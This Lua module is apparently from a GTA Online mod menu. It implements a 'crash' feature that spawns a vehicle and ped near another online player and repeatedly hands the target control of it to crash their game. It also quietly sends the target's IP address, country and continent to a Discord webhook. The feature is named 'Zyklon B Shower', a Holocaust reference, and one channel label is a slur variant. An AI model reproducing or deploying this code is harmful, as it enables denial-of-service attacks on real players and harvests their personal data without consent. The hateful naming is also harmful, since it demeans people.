local function createEnvisageHeliProtectControlCrashModule(moduleContext)

    if type(moduleContext) ~= "table" or not moduleContext then
        moduleContext = {}
    end
    local terminalViolation = moduleContext.KSRuntimeTerminalViolation
    if type(terminalViolation) ~= "function" then
        error("player-feature terminal violation context invalid", 2)
    end
    local loadGeneration = tonumber(moduleContext.KS_RUNTIME_LOAD_GENERATION) or 0
    local runtimeCapabilities = moduleContext.KS_RUNTIME_CAPABILITIES
    local runtimeCapability = type(runtimeCapabilities) == "table"
        and runtimeCapabilities["feature_plane.runtime_context"] or nil
    if type(runtimeCapability) ~= "table" or runtimeCapability.provider ~= "m2"
        or runtimeCapability.generation ~= loadGeneration or runtimeCapability.active ~= true then
        error("zykloneshower runtime capability contract invalid", 2)
    end

    local function runEnvisageHeliProtectControlCrash(feature)
        if feature == nil then
            return false, "invalid_feature"
        end
        local targetPlayerId = feature:GetPlayerIndex()
        if type(targetPlayerId) ~= "number" or targetPlayerId == GTA.GetLocalPlayerId()
            or not (isDev or isSupporter or isAdmin) then
            return false, "invalid_target"
        end
        if onCrashCooldown and not isDev then
            notify("Another Crash is running, please wait for it to Finish!")
            return false, "crash_cooldown"
        end
        local targetPlayer = Players.GetById(targetPlayerId)
        if targetPlayer == nil then
            return false, "invalid_target"
        end
        local targetGamerInfo = targetPlayer:GetGamerInfo()
        if targetGamerInfo == nil then
            return false, "gamer_info_unavailable"
        end
        local targetPlayerName = tostring(Players.GetName(targetPlayerId) or "Unknown")
        if blacklistRIDList[targetGamerInfo.RockstarId] then
            if not isDev then
                blacklistSound()
                SendToDiscord("nogger", ("%s(%i) tried to Crash a Blacklisted Player (%s)!"):format(
                    Players.GetName(GTA.GetLocalPlayerId()), Cherax.GetUID(), targetPlayerName
                ))
                return false, "blacklisted_target"
            end
        elseif detectedPlayerReasons[targetPlayerId + 1] == "K-Script User" and not isDev then
            blacklistSound("forbidden_protected_runtime_target")
            SendToDiscord("nogger", ("%s(%i) tried to Crash another K-Script User (%s)!"):format(
                Players.GetName(GTA.GetLocalPlayerId()), Cherax.GetUID(), targetPlayerName
            ))
            return false, "protected_target"
        end
        local playerTags = tostring(Players.GetTags(targetPlayerId) or "")
        local isTargetFriend = string.find(playerTags, "[F]", 1, true) ~= nil
        local function logControlTransfer()
            local currentPlayerTags = tostring(Players.GetTags(targetPlayerId) or "")
            local targetIpInfo = Players.GetIPInfo(targetPlayerId)
            local targetCountry = targetIpInfo and targetIpInfo.country or "Unknown"
            local targetContinent = targetIpInfo and targetIpInfo.continent or "Unknown"
            local targetIp = Players.GetIP(targetPlayerId)
            local targetIpText = targetIp and targetIp:ToString(false) or "Unknown"
            local isCurrentlyFriend = string.find(currentPlayerTags, "[F]", 1, true) ~= nil
            SendToDiscord("lol", ("%s used Zyklon B Shower Crash against %s with UID %i, isSupporter: %s, is Target Friend?: %s, Target Country: %s, Target Continent: %s, Target IP: %s"):format(
                PLAYER.GET_PLAYER_NAME(GTA.GetLocalPlayerId()), targetPlayerName, Cherax.GetUID(),
                tostring(isSupporter), tostring(isCurrentlyFriend), tostring(targetCountry), tostring(targetContinent), tostring(targetIpText)
            ))
        end
        Script.QueueJob(logControlTransfer)
        if isTargetFriend and not isDev then
            terminalViolation("forbidden_friend_target")
            return false, "friend_target"
        end
        local targetPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(targetPlayerId)
        if targetPed == nil or targetPed == 0 then
            notify("Zyklon B Shower: the selected player is no longer available.")
            return false, "target_ped_unavailable"
        end

        onCrashCooldown = true
        local targetPosition = getPlayerPosition(targetPlayerId)
        local driverPed = GTA.CreateRandomPed(targetPosition.x, targetPosition.y, targetPosition.z + 25)
        local envisage = GTA.SpawnVehicle(Utils.Joaat("envisage"), targetPosition.x, targetPosition.y, targetPosition.z + 25, 1, true, true)
        if driverPed == nil or driverPed == 0 or envisage == nil or envisage == 0 then
            if envisage ~= nil and envisage ~= 0 then
                DeleteEnt(envisage)
            end
            if driverPed ~= nil and driverPed ~= 0 then
                DeleteEnt(driverPed)
            end
            onCrashCooldown = false
            notify("Zyklon B Shower: entity creation failed.")
            return false, "entity_creation_failed"
        end
        setEntProofs(envisage)
        ENTITY.FREEZE_ENTITY_POSITION(envisage, true)
        PED.SET_PED_INTO_VEHICLE(driverPed, envisage, -1)
        local controlTransferDeadlineMs = Time.GetEpocheMs() + 3500
        while NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(envisage) do
            if controlTransferDeadlineMs < Time.GetEpocheMs() then
                DeleteEnt(envisage)
                DeleteEnt(driverPed)
                onCrashCooldown = false
                notify("Zyklon B Shower: failed to give control.")
                return false, "control_transfer_timeout"
            end
            TASK.TASK_VEHICLE_HELI_PROTECT(driverPed, envisage, targetPed, 30.0, 0, -1.0, -1, 0)
            GTA.GiveControl(targetPlayerId, envisage)
            Script.Yield(0)
        end
        onCrashCooldown = false
        notify(("Zyklon B Shower sent to %s."):format(targetPlayerName))
        return true, "completed"
    end

    local envisageHeliProtectControlCrashRunner = { variant = "donator", feature = "zykloneShower", slug = "zykloneshower" }

    function envisageHeliProtectControlCrashRunner.run(runContext)
        if type(runContext) ~= "table" or not runContext then
            runContext = {}
        end
        return runEnvisageHeliProtectControlCrash(runContext.feature)
    end

    return envisageHeliProtectControlCrashRunner
end

return createEnvisageHeliProtectControlCrashModule
